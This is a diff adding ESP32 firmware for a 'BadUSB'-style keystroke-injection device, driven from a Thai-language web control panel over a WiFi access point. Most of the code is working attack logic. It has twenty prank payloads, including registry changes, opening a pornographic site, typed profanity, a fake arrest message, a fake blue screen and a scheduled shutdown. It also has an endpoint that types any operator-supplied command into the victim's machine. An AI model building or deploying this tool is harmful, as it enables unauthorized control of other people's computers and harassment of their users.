@@ -1,0 +1,664 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <ESPmDNS.h>
+#include <Preferences.h>
+#include <USB.h>
+#include <USBHIDKeyboard.h>
+
+// Default WiFi credentials
+const char* default_ssid = "MarkTV";
+const char* default_password = "subtomarktv";
+
+// Global variables
+String wifi_ssid = default_ssid;
+String wifi_password = default_password;
+WebServer server(80);
+Preferences preferences;
+USBHIDKeyboard Keyboard;
+
+// HTML and CSS with cyberpunk green theme (improved)
+const char* htmlContent = R"rawliteral(
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Control Panel</title>
+    <style>
+        :root {
+            --neon-green: #39ff14;
+            --dark-bg: #001100;
+            --medium-bg: #002200;
+            --light-bg: #003300;
+            --text-color: #ccffcc;
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 80, 0, 0.2) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 100, 0, 0.2) 0%, transparent 20%);
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
+            position: relative;
+            background-color: rgba(0, 20, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+        
+        .glitch {
+            font-size: 3em;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: var(--neon-green);
+            text-align: center;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px var(--neon-green);
+            letter-spacing: 2px;
+        }
+        
+        .credit {
+            text-align: center;
+            color: var(--neon-green);
+            margin-bottom: 30px;
+            font-size: 1.2em;
+            opacity: 0.8;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .btn {
+            background-color: var(--medium-bg);
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            box-shadow: 0 0 5px rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn:hover {
+            background-color: var(--light-bg);
+            box-shadow: 0 0 15px var(--neon-green);
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(57, 255, 20, 0.2),
+                transparent,
+                transparent,
+                rgba(57, 255, 20, 0.2)
+            );
+            transform: rotate(30deg);
+            pointer-events: none;
+        }
+        
+        .config-panel {
+            background-color: var(--medium-bg);
+            padding: 20px;
+            border: 1px solid var(--neon-green);
+            margin-bottom: 30px;
+            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+        }
+        
+        .config-panel h3 {
+            margin-top: 0;
+            color: var(--neon-green);
+            border-bottom: 1px solid var(--neon-green);
+            padding-bottom: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--text-color);
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--dark-bg);
+            border: 1px solid var(--neon-green);
+            color: var(--text-color);
+            box-sizing: border-box;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .submit-btn {
+            background-color: var(--dark-bg);
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            box-shadow: 0 0 5px rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .submit-btn:hover {
+            background-color: var(--light-bg);
+            box-shadow: 0 0 15px var(--neon-green);
+        }
+        
+        .payload-section {
+            background-color: var(--medium-bg);
+            padding: 20px;
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            background-color: var(--dark-bg);
+            border: 1px solid var(--neon-green);
+            color: var(--text-color);
+            box-sizing: border-box;
+            resize: vertical;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            text-align: center;
+            border: 1px solid var(--neon-green);
+            background-color: var(--dark-bg);
+            display: none;
+            border-radius: 4px;
+        }
+        
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--neon-green);
+            padding-bottom: 20px;
+        }
+        
+        h2 {
+            color: var(--neon-green);
+            text-align: center;
+            margin-bottom: 20px;
+            text-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="glitch">CYBER CONTROL PANEL</h1>
+            <div class="credit">Create By MarkTV</div>
+            <div class="youtube.com/@MarkTV59</div>
+        </div>
+        
+        <div class="config-panel">
+            <h3>การตั้งค่า WiFi</h3>
+            <form id="wifi-form">
+                <div class="form-group">
+                    <label for="ssid">ชื่อ WiFi:</label>
+                    <input type="text" id="ssid" name="ssid" value="%SSID%" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">รหัสผ่าน WiFi:</label>
+                    <input type="password" id="password" name="password" value="%PASSWORD%" required>
+                </div>
+                <button type="submit" class="submit-btn">บันทึกการตั้งค่า</button>
+            </form>
+        </div>
+        
+        <h2>ตัวเลือกควบคุม</h2>
+        <div class="grid">
+            <button class="btn" onclick="sendCommand(1)">เปิดเสียงเต็ม 100%</button>
+            <button class="btn" onclick="sendCommand(2)">พลิกหน้าจอกลับด้าน</button>
+            <button class="btn" onclick="sendCommand(3)">เปิด Notepad พิมพ์ข้อความกวนๆ</button>
+            <button class="btn" onclick="sendCommand(4)">เปลี่ยน wallpaper เป็นสีดำ</button>
+            <button class="btn" onclick="sendCommand(5)">เปิดเว็บซีเคร็ตโหมดไม่ระบุตัวตน</button>
+            <button class="btn" onclick="sendCommand(6)">สลับปุ่มเมาส์ (ซ้าย-ขวา)</button>
+            <button class="btn" onclick="sendCommand(7)">เปิดเพลง Rick Roll</button>
+            <button class="btn" onclick="sendCommand(8)">ปิดการทำงานของแป้นพิมพ์ชั่วคราว</button>
+            <button class="btn" onclick="sendCommand(9)">เปิด CMD พิมพ์ tree</button>
+            <button class="btn" onclick="sendCommand(10)">แสดงข้อความหลอกว่า Blue Screen</button>
+            <button class="btn" onclick="sendCommand(11)">เปิดเครื่องคิดเลขเต็มหน้าจอ</button>
+            <button class="btn" onclick="sendCommand(12)">เปลี่ยนภาษาแป้นพิมพ์</button>
+            <button class="btn" onclick="sendCommand(13)">เปิดภาพลิงชูนิ้วกลาง</button>
+            <button class="btn" onclick="sendCommand(14)">ทำให้เมาส์เคลื่อนที่แบบสุ่ม</button>
+            <button class="btn" onclick="sendCommand(15)">พิมพ์ข้อความตลกๆ</button>
+            <button class="btn" onclick="sendCommand(16)">เปิดโปรแกรมทั้งหมดที่เปิดอยู่ซ้อนกัน</button>
+            <button class="btn" onclick="sendCommand(17)">ทำให้หน้าจอกระพริบ</button>
+            <button class="btn" onclick="sendCommand(18)">พี่จ๋าไม่ไหวแล้วว</button>
+            <button class="btn" onclick="sendCommand(19)">หน้าต่างแฮกปลอม</button>
+            <button class="btn" onclick="sendCommand(20)">รีสตาร์ทคอมปลอม</button>
+        </div>
+        
+        <div class="payload-section">
+            <h3>Payload Script</h3>
+            <textarea id="payload" placeholder="วางสคริปต์ payload ของคุณที่นี่..."></textarea>
+            <button class="submit-btn" onclick="executePayload()">Execute Payload</button>
+        </div>
+        
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        function sendCommand(cmdId) {
+            fetch('/control', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'command=' + cmdId
+            })
+            .then(response => response.text())
+            .then(data => {
+                showStatus('ส่งคำสั่งแล้ว: ' + cmdId);
+            })
+            .catch(error => {
+                showStatus('ข้อผิดพลาด: ' + error);
+            });
+        }
+        
+        function executePayload() {
+            const payload = document.getElementById('payload').value;
+            if (!payload) {
+                showStatus('กรุณาใส่ payload');
+                return;
+            }
+            
+            fetch('/payload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'payload=' + encodeURIComponent(payload)
+            })
+            .then(response => response.text())
+            .then(data => {
+                showStatus('ดำเนินการ payload แล้ว');
+            })
+            .catch(error => {
+                showStatus('ข้อผิดพลาด: ' + error);
+            });
+        }
+        
+        document.getElementById('wifi-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const ssid = document.getElementById('ssid').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('/wifi', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'ssid=' + encodeURIComponent(ssid) + '&password=' + encodeURIComponent(password)
+            })
+            .then(response => response.text())
+            .then(data => {
+                showStatus('บันทึกการตั้งค่า WiFi แล้ว กำลังรีสตาร์ท...');
+                setTimeout(function() {
+                    showStatus('รีสตาร์ทเรียบร้อยแล้ว กรุณาเชื่อมต่อ WiFi ใหม่');
+                }, 3000);
+            })
+            .catch(error => {
+                showStatus('ข้อผิดพลาด: ' + error);
+            });
+        });
+        
+        function showStatus(message) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
+)rawliteral";
+
+// Function to switch to English keyboard layout
+void switchToEnglishLayout() {
+  // Try different methods to switch to English layout
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // Alternative method for some systems
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_SPACE);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+}
+
+// Function to execute payloads based on command ID
+void executePayload(int command) {
+  // Switch to English layout first
+  switchToEnglishLayout();
+  delay(1000);
+  
+  switch(command) {
+    case 1: // เปิดเสียงเต็ม 100%
+      Keyboard.print("nircmd.exe setsysvolume 65535");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 2: // พลิกหน้าจอ upside down
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press(KEY_DOWN_ARROW);
+      delay(100);
+      Keyboard.releaseAll();
+      break;
+      
+    case 3: // เปิด Notepad พิมพ์ข้อความล้อเล่น
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("notepad");
+      Keyboard.write(KEY_RETURN);
+      delay(1500);
+      Keyboard.print("พ่อมึงตายไอไก่");
+      break;
+      
+    case 4: // เปลี่ยน wallpaper เป็นสีดำ
+      Keyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"\" /f");
+      Keyboard.write(KEY_RETURN);
+      delay(300);
+      Keyboard.print("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 5: // เปิด YouTube ซ่อนเบราว์เซอร์
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("chrome.exe --incognito https://www.xvideos.com/");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 6: // สลับปุ่มเมาส์ (ซ้าย-ขวา)
+      Keyboard.print("reg add \"HKCU\\Control Panel\\Mouse\" /v SwapMouseButtons /t REG_SZ /d 1 /f");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 7: // เปิดเพลง Rick Roll
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("msedge.exe --inprivate https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 8: // ปิดการทำงานของแป้นพิมพ์ชั่วคราว
+      Keyboard.print("pause");
+      Keyboard.write(KEY_RETURN);
+      delay(3000);
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 9: // เปิด CMD พิมพ์ tree
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("cmd /k tree c:\\windows\\system32");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 10: // แสดงข้อความหลอกว่า Blue Screen
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("cmd /k color 1f & echo CRITICAL_ERROR: SYSTEM_FAILURE & echo. & echo Please wait while we diagnose the problem");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 11: // เปิด Calculator เต็มหน้าจอ
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("calc");
+      Keyboard.write(KEY_RETURN);
+      delay(1500);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press(KEY_SPACE);
+      Keyboard.releaseAll();
+      delay(300);
+      Keyboard.press('x');
+      Keyboard.releaseAll();
+      break;
+      
+    case 12: // เปลี่ยนภาษาแป้นพิมพ์
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.releaseAll();
+      break;
+      
+    case 13: // เปิดรูปภาพตลกๆ
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("msedge.exe --inprivate https://i.pinimg.com/1200x/cc/14/d7/cc14d7c6d4576a0dda7d3e6b2ce6ed54.jpg");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 14: // ทำให้เมาส์เคลื่อนที่แบบสุ่ม
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("powershell -command \"Add-Type -AssemblyName System.Windows.Forms; for($i=0; $i -lt 50; $i++) { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080)); Start-Sleep -Milliseconds 100 }\"");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 15: // พิมพ์ข้อความยาวแบบสุ่ม
+      Keyboard.print("เราตรวจพบ Digital Footprint ของคุณว่าแอบเข้าเว็บ SUS เจ้าหน้าที่กำลังเข้าไปจับกุมคุณ");
+      break;
+      
+    case 16: // เปิดโปรแกรมทั้งหมดที่เปิดอยู่ซ้อนกัน
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.press(KEY_TAB);
+      Keyboard.releaseAll();
+      delay(200);
+      for(int i = 0; i < 10; i++) {
+        Keyboard.press(KEY_TAB);
+        Keyboard.releaseAll();
+        delay(100);
+      }
+      break;
+      
+    case 17: // ทำให้หน้าจอกระพริบ
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("powershell -command \"for($i=0; $i -lt 10; $i++) { (Get-Host).UI.RawUI.BackgroundColor = 'Red'; Start-Sleep -Milliseconds 200; (Get-Host).UI.RawUI.BackgroundColor = 'Black'; Start-Sleep -Milliseconds 200 }\"");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 18: // เปิดเสียงสัตว์ร้องแบบสุ่ม
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("msedge.exe --inprivate https://www.youtube.com/watch?v=UsU3dTOYU4Q");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 19: // เลียนแบบการแฮ็กในภาพยนตร์
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      Keyboard.releaseAll();
+      delay(800);
+      Keyboard.print("cmd /k \"color a & echo กำลังโหลดไวรัสเข้าเครื่อง... & echo สแกนระบบ... & echo กำลังบายพาสระบบรักษาความปลอดภัย... & echo ได้สิทธ์แล้ว & echo กำลังดาวโหลดไฟล์ลับ... & echo โหลดไฟล์ลับสำเร็จ & echo ได้ไฟล์ลับแล้วมึง Cook แน่\"");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    case 20: // รีสตาร์ทคอมพิวเตอร์ (หลอก)
+      Keyboard.print("shutdown /r /t 30 /c \"คอมพิวเตอร์ของคุณจะรีสตาร์ทใน 30 วินาที กรุณาบันทึกงานทั้งหมดของคุณ\"");
+      Keyboard.write(KEY_RETURN);
+      delay(10000);
+      Keyboard.print("shutdown /a");
+      Keyboard.write(KEY_RETURN);
+      Keyboard.print("echo ล้อเล่นไม่ปิดหรอก HAHAHA :)");
+      Keyboard.write(KEY_RETURN);
+      break;
+      
+    default:
+      break;
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  
+  // Initialize USB and HID keyboard
+  USB.begin();
+  Keyboard.begin();
+  
+  // Initialize preferences (non-volatile storage)
+  preferences.begin("wifi-config", false);
+  
+  // Try to get saved WiFi settings
+  wifi_ssid = preferences.getString("ssid", default_ssid);
+  wifi_password = preferences.getString("password", default_password);
+  
+  // Set up WiFi in AP mode
+  WiFi.softAP(wifi_ssid.c_str(), wifi_password.c_str());
+  
+  // Set up mDNS for local domain
+  if (!MDNS.begin("cybercontrol")) {
+    Serial.println("Error setting up MDNS responder!");
+  }
+  
+  // Set up server routes
+  server.on("/", HTTP_GET, []() {
+    String page = htmlContent;
+    page.replace("%SSID%", wifi_ssid);
+    page.replace("%PASSWORD%", wifi_password);
+    server.send(200, "text/html", page);
+  });
+  
+  server.on("/control", HTTP_POST, []() {
+    if (server.hasArg("command")) {
+      int command = server.arg("command").toInt();
+      executePayload(command);
+      server.send(200, "text/plain", "Command executed");
+    } else {
+      server.send(400, "text/plain", "Missing command");
+    }
+  });
+  
+  server.on("/payload", HTTP_POST, []() {
+    if (server.hasArg("payload")) {
+      String payload = server.arg("payload");
+      // Switch to English layout first
+      switchToEnglishLayout();
+      delay(1000);
+      
+      // Type out the payload
+      Keyboard.print(payload.c_str());
+      Keyboard.write(KEY_RETURN);
+      server.send(200, "text/plain", "Payload executed");
+    } else {
+      server.send(400, "text/plain", "Missing payload");
+    }
+  });
+  
+  server.on("/wifi", HTTP_POST, []() {
+    if (server.hasArg("ssid") && server.hasArg("password")) {
+      wifi_ssid = server.arg("ssid");
+      wifi_password = server.arg("password");
+      
+      // Save to preferences
+      preferences.putString("ssid", wifi_ssid);
+      preferences.putString("password", wifi_password);
+      
+      server.send(200, "text/plain", "WiFi settings saved. Rebooting...");
+      
+      // Delay to allow response to be sent
+      delay(1000);
+      
+      // Restart ESP to apply new WiFi settings
+      ESP.restart();
+    } else {
+      server.send(400, "text/plain", "Missing SSID or password");
+    }
+  });
+  
+  server.begin();
+  
+  Serial.println("");
+  Serial.print("AP IP address: ");
+  Serial.println(WiFi.softAPIP());
+  Serial.print("SSID: ");
+  Serial.println(wifi_ssid);
+  Serial.print("Password: ");
+  Serial.println(wifi_password);
+  Serial.println("Access the control panel at: http://cybercontrol.local");
+}
+
+void loop() {
+  server.handleClient();
+}
